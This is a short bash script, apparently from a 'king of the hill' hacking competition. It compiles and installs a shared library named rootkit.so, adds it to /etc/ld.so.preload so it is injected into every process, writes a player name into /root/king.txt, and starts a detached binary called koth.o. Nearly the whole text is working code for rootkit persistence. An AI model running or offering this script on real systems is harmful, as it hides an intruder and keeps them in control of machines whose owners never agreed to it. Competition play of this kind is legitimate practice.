#!/bin/bash

# gcc -shared -o rootkit.so -fPIC rootkit.c -ldl
make
sudo cp ./rootkit.so /usr/local/lib/rootkit.so
echo /usr/local/lib/rootkit.so > /etc/ld.so.preload
echo profxadke > /root/king.txt
# gcc -static koth.c -o koth.o 2>/dev/null
./koth.o & disown
